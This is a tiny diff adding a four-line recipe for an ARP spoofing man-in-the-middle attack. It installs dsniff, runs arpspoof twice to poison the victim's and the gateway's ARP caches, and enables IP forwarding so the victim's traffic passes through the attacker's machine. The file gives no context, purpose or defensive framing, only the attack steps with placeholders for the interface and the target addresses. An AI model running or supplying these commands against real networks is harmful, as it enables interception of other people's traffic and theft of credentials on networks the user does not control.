@@ -1,0 +1,4 @@
+apt-get install dsniff
+arpspoof -i (interface) -t (Victime ip/ Gateway)
+arpspoof -i (interface) -t (Gateway/ Victime ip)
+echo 1 > /proc/sys/net/ipv4/ip_forward
